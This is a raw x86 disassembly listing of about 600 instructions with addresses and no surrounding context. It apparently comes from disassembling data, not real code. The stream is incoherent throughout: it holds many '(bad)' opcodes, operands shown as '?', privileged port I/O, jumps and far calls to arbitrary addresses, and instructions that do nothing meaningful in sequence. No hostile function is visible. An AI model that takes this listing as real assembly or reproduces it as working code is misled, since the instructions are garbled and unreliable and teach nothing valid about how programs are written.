  423f65:	scas   eax,DWORD PTR es:[edi]
  423f66:	aaa    
  423f67:	add    eax,0x77f4977a
  423f6c:	add    BYTE PTR [edi+0x3032e80],bl
  423f72:	xchg   ebx,eax
  423f73:	push   ebp
  423f74:	xlat   BYTE PTR ds:[ebx]
  423f75:	repz je 0x423f33
  423f78:	fnstsw WORD PTR [ebx-0x79]
  423f7b:	xor    eax,0x887f9dc6
  423f80:	dec    DWORD PTR [edx-0x31446053]
  423f86:	popa   
  423f87:	int    0x43
  423f89:	fsub   DWORD PTR [esi]
  423f8b:	ds stos BYTE PTR es:[edi],al
  423f8d:	jne    0x423f79
  423f8f:	paddd  mm5,QWORD PTR [ecx-0x2b]
  423f93:	sbb    eax,DWORD PTR [esi-0x5f133a6a]
  423f99:	xchg   edx,eax
  423f9a:	test   DWORD PTR [ebp+eiz*8+0x78582634],ebx
  423fa1:	push   es
  423fa2:	test   BYTE PTR [edx+0xc81f14b],0xca
  423fa9:	data16 sti 
  423fab:	std    
  423fac:	jne    0x423f4f
  423fae:	xchg   edx,eax
  423faf:	pop    ecx
  423fb0:	sbb    esp,eax
  423fb2:	adc    BYTE PTR [esi],0xc8
  423fb5:	fwait
  423fb6:	xchg   esp,eax
  423fb7:	dec    esp
  423fb8:	inc    eax
  423fb9:	or     esp,esp
  423fbb:	jp     0x423fad
  423fbd:	mov    WORD PTR [eax-0x65],?
  423fc0:	xor    edx,ecx
  423fc2:	xchg   edi,eax
  423fc3:	test   BYTE PTR [ebx-0x8],0xb2
  423fc7:	aaa    
  423fc8:	call   0x5184b564
  423fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fce:	sbb    DWORD PTR [eax-0x56],ecx
  423fd1:	mov    cl,0x3f
  423fd3:	and    ch,BYTE PTR [esi+esi*2+0x4d]
  423fd7:	add    ecx,esp
  423fd9:	push   ebp
  423fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fdb:	lods   eax,DWORD PTR ds:[esi]
  423fdc:	push   es
  423fdd:	outs   dx,DWORD PTR ds:[esi]
  423fde:	mov    al,ds:0xe7ba46a8
  423fe3:	mov    cl,0xc0
  423fe5:	gs sbb eax,0xef93f916
  423feb:	fist   DWORD PTR [ebx-0x73]
  423fee:	lds    esp,FWORD PTR [edx-0x5a4d30a0]
  423ff4:	and    BYTE PTR [eax+0x44039c04],al
  423ffa:	mov    esi,eax
  423ffc:	(bad)  
  423ffd:	adc    edx,DWORD PTR ds:0x6d22dce2
  424003:	test   eax,0x44b1a84a
  424008:	frstor [edi]
  42400a:	cmp    eax,0x1f3df778
  42400f:	sbb    dh,BYTE PTR [eax-0x3]
  424012:	clc    
  424013:	jbe    0x42400d
  424015:	enter  0x628a,0x73
  424019:	inc    edx
  42401a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42401b:	dec    ebx
  42401c:	dec    esi
  42401d:	cmp    DWORD PTR [ebx+0x1],esi
  424020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424021:	cmc    
  424022:	sbb    BYTE PTR [ebp-0x40],ch
  424025:	cmp    eax,0x8738453f
  42402a:	or     eax,esi
  42402c:	mov    al,BYTE PTR [esi]
  42402e:	mov    eax,0xb81029ed
  424033:	bound  edx,QWORD PTR [esi]
  424035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424036:	jmp    0x424074
  424038:	fiadd  WORD PTR [edx]
  42403a:	jns    0x424076
  42403c:	sbb    DWORD PTR [ebx],ecx
  42403e:	or     eax,DWORD PTR [edx-0x587150a1]
  424044:	cmp    eax,0xd59ca5dd
  424049:	cmp    esi,DWORD PTR [ecx-0x53]
  42404c:	mov    esi,cs
  42404e:	call   0x9804e4e1
  424053:	inc    eax
  424054:	imul   ebx,esi,0xffffff8b
  424057:	jg     0x42400e
  424059:	popa   
  42405a:	push   cs
  42405b:	jnp    0x424023
  42405d:	push   eax
  42405e:	dec    edi
  42405f:	jnp    0x424058
  424061:	jno    0x423feb
  424063:	(bad)  
  424064:	test   eax,0x1bdfd6f7
  424069:	mul    BYTE PTR [ebx-0x4fa3d8d3]
  42406f:	ins    BYTE PTR es:[edi],dx
  424070:	aad    0xff
  424072:	loop   0x42401c
  424074:	inc    esp
  424075:	add    bl,cl
  424077:	les    edx,FWORD PTR [eax]
  424079:	and    bl,BYTE PTR [edi-0x435c7936]
  42407f:	hlt    
  424080:	loop   0x4240c7
  424082:	mov    dh,0xc1
  424084:	jo     0x4240dd
  424086:	dec    edi
  424087:	add    eax,0xfa410bc4
  42408c:	loopne 0x42404c
  42408e:	inc    eax
  42408f:	clc    
  424090:	mov    eax,DWORD PTR [ebp+ecx*8+0x2ed00758]
  424097:	(bad)
  42409a:	sub    eax,0x592abe86
  42409f:	mov    WORD PTR ds:0x4be53ebc,?
  4240a5:	pop    ecx
  4240a6:	jle    0x424032
  4240a8:	lds    eax,FWORD PTR [edx]
  4240aa:	xlat   BYTE PTR ds:[ebx]
  4240ab:	or     BYTE PTR [edx],cl
  4240ad:	fs dec esi
  4240af:	mov    edx,0x3e1a7e6e
  4240b4:	addr16 dec ebp
  4240b6:	mov    ah,bh
  4240b8:	int3   
  4240b9:	fisttp QWORD PTR [esi]
  4240bb:	test   eax,0x8cc92f21
  4240c0:	pop    ebp
  4240c1:	daa    
  4240c2:	cmp    BYTE PTR [ebp+0x9],ch
  4240c5:	inc    edi
  4240c6:	or     bh,BYTE PTR ds:0xc9db3198
  4240cc:	jmp    0xc4027709
  4240d1:	inc    eax
  4240d2:	scas   eax,DWORD PTR es:[edi]
  4240d3:	out    dx,eax
  4240d4:	(bad)  
  4240d5:	scas   al,BYTE PTR es:[edi]
  4240d6:	push   esp
  4240d7:	retf   
  4240d8:	cs arpl si,si
  4240db:	in     al,dx
  4240dc:	call   0x9de0:0xfa4e3d7e
  4240e3:	test   BYTE PTR [edx+0x3ba1771c],ah
  4240e9:	dec    edx
  4240ea:	mov    ebp,0xb7c973cc
  4240ef:	pop    ebp
  4240f0:	cmp    eax,0xc2f5a221
  4240f5:	inc    ebx
  4240f6:	or     BYTE PTR [eax],0xf4
  4240f9:	dec    ebx
  4240fa:	xor    edx,ebx
  4240fc:	jl     0x424103
  4240fe:	adc    DWORD PTR [edx+eiz*4],edx
  424101:	hlt    
  424102:	(bad)  
  424104:	shl    BYTE PTR [edi+0x43],1
  424107:	mov    ebp,0x21de641b
  42410c:	push   edi
  42410d:	aas    
  42410e:	arpl   WORD PTR [edi-0x1d],di
  424111:	ret    
  424112:	lock jae 0x424134
  424115:	jbe    0x42418a
  424117:	xor    eax,0xbaabc874
  42411c:	xor    al,0x63
  42411e:	ja     0x424195
  424120:	cwde   
  424121:	cli    
  424122:	scas   eax,DWORD PTR es:[edi]
  424123:	cli    
  424124:	push   ds
  424125:	mov    DWORD PTR ds:0xb7196389,esp
  42412b:	or     esi,DWORD PTR [edx-0x4a]
  42412e:	stos   BYTE PTR es:[edi],al
  42412f:	pop    ebp
  424130:	dec    esp
  424131:	adc    DWORD PTR [eax],ebx
  424133:	int3   
  424134:	mov    cl,0xaa
  424136:	jbe    0x42413f
  424138:	and    dl,BYTE PTR [ebx-0x51]
  42413b:	lahf   
  42413c:	or     ah,BYTE PTR [edx+edx*8-0x58]
  424140:	test   al,0xc8
  424142:	aaa    
  424143:	scas   eax,DWORD PTR es:[edi]
  424144:	aad    0x19
  424146:	lods   eax,DWORD PTR ds:[esi]
  424147:	(bad)  
  424148:	sbb    eax,0xdb26f4f7
  42414d:	iret   
  42414e:	mov    esi,0x519c8ea
  424153:	mov    al,0xa6
  424155:	mov    esi,0x8bc30413
  42415a:	mov    WORD PTR [edi],es
  42415c:	retf   0x788a
  42415f:	sub    cl,ch
  424161:	xor    al,0xe6
  424163:	jp     0x424150
  424165:	ja     0x42417f
  424167:	jl     0x4240ed
  424169:	arpl   WORD PTR [edi],bx
  42416b:	call   0xf8be:0xf18667ba
  424172:	mov    ebp,0xfcf2d9e2
  424177:	dec    ecx
  424178:	add    al,0x1a
  42417a:	add    bh,BYTE PTR ds:0x69be9054
  424180:	je     0x42418c
  424182:	cmp    eax,0x9292826a
  424187:	std    
  424188:	add    DWORD PTR [eax-0x785f8bdf],esp
  42418e:	test   al,0xfa
  424190:	mov    esi,?
  424192:	cmc    
  424193:	mov    al,0x69
  424195:	push   es
  424196:	adc    al,0x25
  424198:	lods   al,BYTE PTR ds:[esi]
  424199:	repnz out dx,al
  42419b:	xor    bl,BYTE PTR [ebx]
  42419d:	or     dl,ch
  42419f:	push   ebp
  4241a0:	mov    esi,DWORD PTR [eax+0x77]
  4241a3:	pop    eax
  4241a4:	xchg   edx,eax
  4241a5:	popa   
  4241a6:	jecxz  0x42416c
  4241a8:	retf   0xbe85
  4241ab:	xlat   BYTE PTR ds:[ebx]
  4241ac:	scas   al,BYTE PTR es:[edi]
  4241ad:	add    edx,ebx
  4241af:	and    ebx,DWORD PTR [ecx-0x5f]
  4241b2:	rcl    DWORD PTR [ecx+0x3d877912],cl
  4241b8:	xchg   edi,edi
  4241ba:	inc    edi
  4241bb:	cmp    DWORD PTR [edi],ecx
  4241bd:	push   ebp
  4241be:	pop    ebx
  4241bf:	push   ds
  4241c0:	mov    WORD PTR [edi+0x3b],?
  4241c3:	sub    ah,bl
  4241c5:	mov    BYTE PTR [esi],dh
  4241c7:	xor    bh,BYTE PTR [eax-0x519552d2]
  4241cd:	add    eax,0x52441ebe
  4241d2:	rep lods al,BYTE PTR ds:[esi]
  4241d4:	adc    dl,BYTE PTR ss:[eax]
  4241d7:	loop   0x42421c
  4241d9:	push   edi
  4241da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241db:	ret    
  4241dc:	sub    al,0x52
  4241de:	out    dx,al
  4241df:	div    BYTE PTR [eax]
  4241e1:	cmp    dh,BYTE PTR [eax]
  4241e3:	mov    ss:0xebf409af,eax
  4241e9:	xor    DWORD PTR [ecx+edx*2+0x0],ebp
  4241ed:	call   0x1119:0x1ab65ae9
  4241f4:	dec    edx
  4241f5:	ja     0x42420d
  4241f7:	mov    ebp,0x80d797be
  4241fc:	fs or  eax,0x3253c851
  424202:	jnp    0x424265
  424204:	dec    edi
  424205:	daa    
  424206:	and    al,bh
  424208:	sub    bh,bl
  42420a:	scas   eax,DWORD PTR es:[edi]
  42420b:	jns    0x4241ec
  42420d:	mov    ebp,0x1cb3af36
  424212:	jp     0x4241cf
  424214:	mov    ah,0x36
  424216:	idiv   DWORD PTR [edx+ebx*4-0x697cb053]
  42421d:	jl     0x42428c
  42421f:	lods   eax,DWORD PTR ds:[esi]
  424220:	jecxz  0x4241c2
  424222:	adc    esi,DWORD PTR [ecx+0x56]
  424225:	stc    
  424226:	push   cs
  424227:	sar    BYTE PTR [esi],1
  424229:	cs and bh,dh
  42422c:	retf   0x3fc
  42422f:	xchg   edx,eax
  424230:	adc    al,0x50
  424232:	push   ss
  424233:	mov    edi,0x9b5ac832
  424238:	inc    edx
  424239:	pop    ss
  42423a:	shl    BYTE PTR [ebx],1
  42423c:	das    
  42423d:	imul   edx,DWORD PTR [ebx-0x49d62daa],0x48
  424244:	imul   edx
  424246:	mov    bl,0x60
  424248:	arpl   WORD PTR [edi-0x1c6bae8c],sp
  42424e:	mov    ch,0xc9
  424250:	cs mov ah,ch
  424253:	xlat   BYTE PTR ds:[ebx]
  424254:	ficom  DWORD PTR ds:0xfcff
  42425a:	add    BYTE PTR [eax],al
  42425c:	add    BYTE PTR [eax],al
  42425e:	add    BYTE PTR [eax],al
  424260:	add    bh,dh
  424262:	in     eax,0x9f
  424264:	jp     0x424205
  424266:	jp     0x42425f
  424268:	in     eax,dx
  424269:	sar    DWORD PTR [edi+0x37d1212c],1
  42426f:	div    DWORD PTR [ecx-0x36]
  424272:	mov    edx,0x3af0001
  424277:	add    BYTE PTR [eax],al
  424279:	adc    esi,DWORD PTR [ecx]
  42427b:	retf   
  42427c:	nop
  42427d:	test   DWORD PTR [ecx-0x36],edx
  424280:	inc    edi
  424281:	stc    
  424282:	(bad)  
  424283:	push   ds
  424284:	cmc    
  424285:	mov    eax,0x8da5c02b
  42428a:	test   eax,0xae8541f1
  42428f:	jb     0x4242d5
  424291:	cmp    eax,esi
  424293:	arpl   WORD PTR [esi-0x6],ax
  424296:	xchg   bh,dl
  424298:	and    ebx,DWORD PTR [edx]
  42429a:	cmp    al,bl
  42429c:	sub    edi,DWORD PTR [edx+eax*8-0x75]
  4242a0:	cmp    al,0xc5
  4242a2:	rcr    DWORD PTR [edi+0x561ebeba],0xf1
  4242a9:	clc    
  4242aa:	enter  0xdbeb,0x38
  4242ae:	mov    WORD PTR [ecx],fs
  4242b0:	nop
  4242b1:	and    DWORD PTR [ebp-0x33aa5c65],esi
  4242b7:	sub    DWORD PTR [di+0x3fab],ebx
  4242bc:	dec    ecx
  4242bd:	data16 jge 0x4242c4
  4242c0:	retf   
  4242c1:	xchg   esp,eax
  4242c2:	inc    esi
  4242c3:	dec    ebx
  4242c4:	not    DWORD PTR [esp+ecx*2]
  4242c7:	scas   al,BYTE PTR es:[edi]
  4242c8:	pushf  
  4242c9:	and    DWORD PTR [esi-0x4d8d24a6],edx
  4242cf:	aas    
  4242d0:	jne    0x4242a3
  4242d2:	sbb    al,0x5b
  4242d4:	and    eax,0x4498ce84
  4242d9:	lds    esp,FWORD PTR [esi+0x4306b72e]
  4242df:	fdivr  DWORD PTR [esi]
  4242e1:	add    dh,BYTE PTR [ecx+0x2bb55b7b]
  4242e7:	mov    bl,0xb5
  4242e9:	clc    
  4242ea:	push   cs
  4242eb:	(bad)  
  4242ec:	jmp    0x42429e
  4242ee:	xor    esi,DWORD PTR [edx+0x7e41c7ae]
  4242f4:	xchg   ebp,eax
  4242f5:	out    dx,eax
  4242f6:	and    eax,DWORD PTR [edx-0x6c]
  4242f9:	out    0x10,al
  4242fb:	push   ecx
  4242fc:	jmp    0x1782:0x7b5d032e
  424303:	cli    
  424304:	cmp    eax,DWORD PTR [ecx-0x2d7ebc81]
  42430a:	out    dx,eax
  42430b:	mov    eax,ds:0x156c581d
  424310:	mov    gs,WORD PTR [ecx+edx*1+0x73]
  424314:	in     eax,dx
  424315:	and    al,0x12
  424317:	clc    
  424318:	sbb    ah,bl
  42431a:	and    ah,dl
  42431c:	(bad)  
  42431d:	sahf   
  42431e:	jbe    0x424362
  424320:	shl    DWORD PTR [edx],0xe5
  424323:	cmp    al,0xd5
  424325:	int3   
  424326:	inc    ebx
  424327:	pop    esi
  424328:	push   es
  424329:	adc    ecx,DWORD PTR [ebx+0x10]
  42432c:	pop    es
  42432d:	ja     0x42431d
  42432f:	aas    
  424330:	dec    ebp
  424331:	sub    ch,BYTE PTR [ecx-0x467fbf31]
  424337:	and    al,0xaa
  424339:	popf   
  42433a:	iret   
  42433b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42433c:	aam    0xe9
  42433e:	sub    eax,0x371a91e8
  424343:	inc    esi
  424344:	cld    
  424345:	jbe    0x42435d
  424347:	adc    esp,DWORD PTR [ebx-0x11f954ca]
  42434d:	(bad)  
  42434f:	dec    esi
  424350:	pop    ebx
  424351:	pop    ss
  424352:	outs   dx,BYTE PTR ds:[esi]
  424353:	mov    ebp,DWORD PTR [esi]
  424355:	fs jbe 0x4243bc
  424358:	std    
  424359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42435a:	sub    ebp,DWORD PTR [edx+0x40]
  42435d:	mov    ah,bl
  42435f:	pop    esp
  424360:	dec    ebx
  424361:	loop   0x424312
  424363:	dec    ebp
  424364:	out    dx,eax
  424365:	je     0x42430e
  424367:	ss inc edx
  424369:	mov    ebx,0xea188b03
  42436e:	lods   al,BYTE PTR ds:[esi]
  42436f:	mov    bh,0x22
  424371:	inc    ebx
  424372:	lahf   
  424373:	sbb    eax,0x1a03816c
  424378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424379:	retf   0x5d95
  42437c:	aas    
  42437d:	add    BYTE PTR [esi-0x346bfeb],bh
  424383:	icebp  
  424384:	mov    ebp,0xb4a5bec6
  424389:	or     al,0x50
  42438b:	add    DWORD PTR [ebx+ebp*1-0x796dad9d],ecx
  424392:	repz pop cx
  424395:	adc    al,BYTE PTR [ecx-0x49]
  424398:	pop    eax
  424399:	mov    al,ds:0x4dd7e2f1
  42439e:	out    0x77,eax
  4243a0:	inc    ebp
  4243a1:	jl     0x4243fa
  4243a3:	pop    ecx
  4243a4:	scas   eax,DWORD PTR es:[edi]
  4243a5:	pop    DWORD PTR [edx+0x44]
  4243a8:	lods   eax,DWORD PTR ds:[esi]
  4243a9:	inc    edi
  4243aa:	add    esi,DWORD PTR [ebx+0x57]
  4243ad:	dec    edi
  4243ae:	pop    edi
  4243af:	mov    al,0x8
  4243b1:	loopne 0x424407
  4243b3:	ficom  DWORD PTR [eax-0x2e84ef59]
  4243b9:	ins    DWORD PTR es:[edi],dx
  4243ba:	mov    ecx,0x813c85b4
  4243bf:	jecxz  0x424422
  4243c1:	ret    0x3d83
  4243c4:	shr    BYTE PTR [ebp+0x3452279d],0xc0
  4243cb:	mov    dh,0x66
  4243cd:	mov    ecx,0x4efe39f
  4243d2:	mov    ecx,0x92468e65
  4243d7:	xor    cl,BYTE PTR [edi*8+0x685615fa]
  4243de:	nop
  4243df:	fucomip st,st(5)
  4243e1:	loop   0x42445b
  4243e3:	xor    ecx,DWORD PTR [edx+0x9]
  4243e6:	jl     0x4243b2
  4243e8:	sub    al,0x88
  4243ea:	cmc    
  4243eb:	test   eax,0xb7c75e6e
  4243f0:	pop    ebx
  4243f1:	lods   eax,DWORD PTR ds:[esi]
  4243f2:	sub    eax,0x698af95a
  4243f7:	in     eax,0x63
  4243f9:	xchg   esp,eax
  4243fa:	pop    ss
  4243fb:	push   edx
  4243fc:	rcl    BYTE PTR [ecx],cl
  4243fe:	sub    eax,0xa179273a
  424403:	addr16 adc esi,eax
  424406:	in     eax,dx
  424407:	ror    BYTE PTR [ebx-0x15],1
  42440a:	nop
  42440b:	cmp    DWORD PTR [edx+0x4cb98646],esp
  424411:	cli    
  424412:	in     al,dx
  424413:	cmp    BYTE PTR ds:0x5a97f899,0x76
  42441a:	push   esp
  42441b:	dec    edi
  42441c:	xchg   ebp,eax
  42441d:	sub    BYTE PTR [eax-0x2d],bl
  424420:	xchg   esi,eax
  424421:	and    BYTE PTR [esi+0x3d],0xab
  424425:	push   ecx
  424426:	xchg   esp,eax
  424427:	test   dl,0xa
  42442a:	push   ebx
  42442b:	mov    ds:0xf29ec266,al
  424430:	mov    DWORD PTR [edi-0xa],esi
  424433:	dec    edi
  424434:	cmp    eax,0xebb79440
  424439:	jns    0x4244af
  42443b:	push   ecx
  42443c:	test   BYTE PTR [eax],0xbd
  42443f:	(bad)  
  424440:	or     DWORD PTR [ebx+ecx*1-0x6a8f50d8],eax
  424447:	dec    edx
  424448:	or     al,0x8d
  42444a:	repz mov edx,0x33f0d101
  424450:	jno    0x4243f8
  424452:	retf   
  424453:	jl     0x4243da
  424455:	pop    es
  424456:	cdq    
  424457:	outs   dx,DWORD PTR ds:[esi]
  424458:	scas   eax,DWORD PTR es:[edi]
  424459:	jl     0x4243fc
  42445b:	ficomp DWORD PTR [edi+0x1f]
  42445e:	mov    dh,0xee
  424460:	mov    eax,ds:0xa80d6df
  424465:	dec    ecx
  424466:	inc    edx
  424467:	xchg   edx,eax
  424468:	jne    0x42447c
  42446a:	pushf  
  42446b:	cmc    
  42446c:	sahf   
  42446d:	jl     0x4244ab
  42446f:	fs add cl,bl
  424472:	repz mov ds:0xac97902f,al
  424478:	lods   al,BYTE PTR ds:[esi]
  424479:	gs addr16 out dx,al
  42447c:	and    BYTE PTR [edx-0x29],0x39
  424480:	aad    0x1f
  424482:	push   cs
  424483:	stos   DWORD PTR es:[edi],eax
  424484:	stos   DWORD PTR es:[edi],eax
  424485:	test   DWORD PTR [ecx+0x62d88400],ebp
  42448b:	pop    ebx
  42448c:	in     al,dx
  42448d:	lds    esi,FWORD PTR fs:[edi-0x6623ab52]
  424494:	xchg   BYTE PTR [eax+0x0],cl
  424497:	pop    ebp
  424498:	imul   edi,DWORD PTR [ebx+0x4f69f358],0x48aac2fb
  4244a2:	add    ah,BYTE PTR [esi+0x7bd29430]
  4244a8:	jb     0x4244b3
  4244aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244ab:	push   edx
  4244ac:	sub    DWORD PTR [esi],esp
  4244ae:	scas   al,BYTE PTR es:[edi]
  4244af:	(bad)  
  4244b0:	scas   eax,DWORD PTR es:[edi]
  4244b1:	sahf   
  4244b2:	lods   eax,DWORD PTR ds:[esi]
  4244b3:	imul   ebx,DWORD PTR [ebp-0x2e2cca2]
  4244ba:	push   cs
  4244bb:	sbb    ah,BYTE PTR fs:[ecx+0x674f8ffe]
  4244c2:	enter  0x5a72,0x8e
  4244c6:	and    al,0xb
  4244c8:	adc    BYTE PTR [esi],cl
  4244ca:	retf   
  4244cb:	push   esi
  4244cc:	pop    edi
  4244cd:	aad    0xb1
  4244cf:	mov    ecx,0xd651d509
  4244d4:	cmc    
  4244d5:	cmp    ebp,DWORD PTR [esi+edx*1-0x7e]
  4244d9:	sub    BYTE PTR [ecx],0x31
  4244dc:	dec    eax
  4244dd:	stos   DWORD PTR es:[edi],eax
  4244de:	xchg   ebp,eax
  4244df:	or     ch,BYTE PTR [edx+ecx*2]
  4244e2:	adc    ah,BYTE PTR ds:0xb764b6d8
  4244e8:	popf   
  4244e9:	js     0x42454a
  4244eb:	jg     0x424546
  4244ed:	in     al,0x2f
  4244ef:	push   es
  4244f0:	rdtsc  
  4244f2:	test   eax,0xaf5dad64
  4244f7:	fst    QWORD PTR [ecx+0x4f31822f]
  4244fd:	cmp    edx,DWORD PTR [edx+0x18]
  424500:	out    0x32,eax
  424502:	or     DWORD PTR [ebx+0x25549c71],esi
  424508:	int    0x92
  42450a:	arpl   WORD PTR [edi-0xec5b809],ax
  424510:	mov    BYTE PTR gs:[esi],0x29
  424514:	cmp    esp,eax
  424516:	icebp  
  424517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424518:	lods   al,BYTE PTR ds:[esi]
  424519:	out    0x32,eax
  42451b:	int3   
  42451c:	pushf  
  42451d:	sbb    BYTE PTR [eax+0x16273632],0x75
  424524:	adc    al,0x7e
  424526:	loope  0x424529
  424528:	lds    ebp,FWORD PTR cs:[edx+0x76982951]
  42452f:	pcmpeqb mm4,mm2
  424532:	jle    0x4244b9
  424534:	add    DWORD PTR [ecx],edx
  424536:	xchg   ebx,eax
  424537:	int    0xc0
  424539:	mov    DWORD PTR [eax],ebp
  42453b:	cmp    eax,0x6065817f
  424540:	cmp    ebx,ecx
  424542:	out    0xa,eax
  424544:	jb     0x42454c
  424546:	icebp  
  424547:	or     eax,0xfa14cd72
  42454c:	xor    eax,0x35b9c699
  424551:	ret    
  424552:	mov    eax,0x9d6c974
  424557:	sbb    dl,bl
  424559:	xchg   edx,eax
  42455a:	push   ds
  42455b:	ins    BYTE PTR es:[edi],dx
  42455c:	(bad)  
  42455d:	push   cs
  42455e:	push   ebp
  42455f:	jmp    0x4245be
  424561:	aam    0x38
  424563:	(bad)  
  424564:	jne    0x4245bd
  424566:	scas   al,BYTE PTR es:[edi]
  424567:	or     esi,DWORD PTR [esi-0x69]
  42456a:	dec    esi
  42456b:	test   al,0xbe
  42456d:	xor    DWORD PTR [eax-0x5a1713c8],ebx
  424573:	nop
  424574:	push   ds
  424575:	and    BYTE PTR [ecx],al
  424577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424578:	xchg   edx,eax
  424579:	pop    ss
  42457a:	mov    bh,0x66
  42457c:	loope  0x424534
  42457e:	pop    eax
  42457f:	mov    ds:0xb72133c7,al
  424584:	xor    al,0xb2
  424586:	test   BYTE PTR [edx-0x37],cl
  424589:	mov    WORD PTR ds:0xbf0fa6bf,?
  42458f:	push   ebp
  424590:	cdq    
  424591:	and    eax,0x852ba6
  424596:	push   ebp
  424597:	jb     0x424588
  424599:	icebp  
  42459a:	and    ecx,0x3c
  42459d:	in     eax,dx
  42459e:	cwde   
  42459f:	int    0x5e
  4245a1:	(bad)  
  4245a3:	pop    ecx
  4245a4:	push   eax
  4245a5:	lds    ecx,FWORD PTR [ebp+0x63]
  4245a8:	aad    0xc2
  4245aa:	lahf   
  4245ab:	cmp    ah,BYTE PTR [edi-0x55]
  4245ae:	int    0x30
  4245b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245b1:	dec    ecx
  4245b2:	jecxz  0x424552
  4245b4:	sub    eax,DWORD PTR [edi+0x75]
  4245b7:	cs mov ebx,0x62d95d0b
  4245bd:	ins    DWORD PTR es:[edi],dx
  4245be:	lock test al,0x1a
  4245c1:	mov    ebp,0xe085eb9d
  4245c6:	(bad)  
  4245c7:	shl    esi,1
  4245c9:	push   0x8cae223d
  4245ce:	jnp    0x42459f
  4245d0:	icebp  
  4245d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d2:	pop    eax
  4245d3:	out    0x93,eax
  4245d5:	xchg   ebx,eax
  4245d6:	mov    esi,0xf8af9c17
  4245db:	or     BYTE PTR [edi+0x122e1dbd],0xbd
  4245e2:	inc    edx
  4245e3:	repnz sar BYTE PTR [edx+esi*8-0x6b34859b],1
  4245eb:	mov    ch,0x2
  4245ed:	es mov dh,0x31
  4245f0:	mov    dl,BYTE PTR [edi]
  4245f2:	xchg   DWORD PTR [ebp-0x1cf736c7],ebx
  4245f8:	dec    ecx
  4245f9:	cmp    ebp,DWORD PTR [eax-0x1]
  4245fc:	call   0xd7878d70
  424601:	shr    DWORD PTR [ebp+0x4d],1
  424604:	sub    esi,ebp
  424606:	push   esp
  424607:	into   
  424608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424609:	call   edi
  42460b:	outs   dx,DWORD PTR ds:[esi]
  42460c:	test   al,0x54
  42460e:	adc    DWORD PTR [ecx+ebp*8-0x2e],0xffffffb3
  424613:	leave  
  424614:	pop    esi
  424615:	fstp   QWORD PTR [esi]
  424617:	(bad)  
  424618:	xlat   BYTE PTR ds:[ebx]
  424619:	rcr    DWORD PTR [bx+si-0x17],cl
  42461d:	jg     0x4245c9
  42461f:	cmp    dh,BYTE PTR ds:0x52cf1c24
  424625:	call   0x0:0xacf0
  42462c:	add    BYTE PTR [eax],al
  42462e:	add    BYTE PTR [eax],al
  424630:	add    BYTE PTR [ebx-0x71],ch
  424633:	mov    bh,BYTE PTR [esi+ebp*8+0x7d]
  424637:	call   FWORD PTR [edi+0x4fc17c56]
  42463d:	and    al,BYTE PTR [ebx]
  42463f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424640:	(bad)  
  424641:	jns    0x424601
  424643:	add    DWORD PTR [eax],eax
  424645:	scas   eax,DWORD PTR es:[edi]
  424646:	add    eax,DWORD PTR [eax]
  424648:	add    cl,dl
  42464a:	sub    BYTE PTR [ebp-0x3459f227],0x6a
  424651:	es xor eax,esp
  424654:	mov    al,0x57
  424656:	jg     0x4246ad
  424658:	cs inc esi
  42465a:	aad    0xd0
  42465c:	das    
  42465d:	in     eax,dx
  42465e:	std    
  42465f:	push   esp
  424660:	or     eax,0x84ef80c1
  424665:	retf   0x54eb
  424668:	push   edi
  424669:	push   0x76
  42466b:	iret   
  42466c:	out    dx,al
  42466d:	pop    ss
  42466e:	adc    eax,0x45a6deda
  424673:	push   ds
  424674:	popf   
  424675:	jbe    0x4246dc
  424677:	xchg   edx,eax
  424678:	and    DWORD PTR [ebx-0x65199ba8],ecx
  42467e:	ficom  WORD PTR [ebp+0x5]
  424681:	cld    
  424682:	retf   
  424683:	jb     0x424686
  424685:	ins    BYTE PTR es:[edi],dx
  424686:	and    ecx,DWORD PTR [ebx-0x5b36401b]
  42468c:	inc    edx
  42468d:	xchg   BYTE PTR [edx+0x7f6263c],dh
  424693:	out    dx,al
  424694:	mov    edx,0x35f020d8
  424699:	mov    cl,0x6e
  42469b:	mov    eax,ds:0x288ef1ea
  4246a0:	pop    ds
  4246a1:	(bad)  
  4246a2:	test   esp,0x2e205e73
  4246a8:	into   
  4246a9:	inc    edi
  4246aa:	jge    0x4246d0
  4246ac:	ja     0x42471a
  4246ae:	int    0x5c
  4246b0:	icebp  
  4246b1:	(bad)  
  4246b2:	(bad)  
  4246b3:	daa    
  4246b4:	loope  0x4246ba
  4246b6:	scas   al,BYTE PTR es:[edi]
  4246b7:	mov    cl,0x34
  4246b9:	imul   esi,DWORD PTR [edx+eiz*2-0x5cc0e16c],0x746c038e
  4246c4:	dec    ebx
  4246c5:	sbb    al,0xca
  4246c7:	les    edi,FWORD PTR [ecx+0x73d077e5]
  4246cd:	stc    
  4246ce:	mov    edx,0xd2864d3d
  4246d3:	pop    edi
  4246d4:	call   0x86e28ab8
  4246d9:	xor    esp,DWORD PTR [ebp+0x4c]
  4246dc:	stc    
  4246dd:	dec    eax
  4246de:	repz or DWORD PTR [edx+0x13ff86bb],ecx
  4246e5:	je     0x4246e2
  4246e7:	jo     0x424765
  4246e9:	jne    0x424749
  4246eb:	icebp  
  4246ec:	mov    ecx,0xc98d2fd8
  4246f1:	xchg   esp,eax
  4246f2:	std    
  4246f3:	jmp    0x6a4d:0xcc4479a8
  4246fa:	in     al,0x8f
  4246fc:	aam    0x9d
  4246fe:	fwait
  4246ff:	sub    ebp,ebx
  424701:	push   ds
  424702:	push   cs
  424703:	lds    edi,FWORD PTR [esi-0x857b469]
  424709:	icebp  
  42470a:	fadd   DWORD PTR [ecx]
  42470c:	mov    ds:0x9664d455,eax
  424711:	gs sahf 
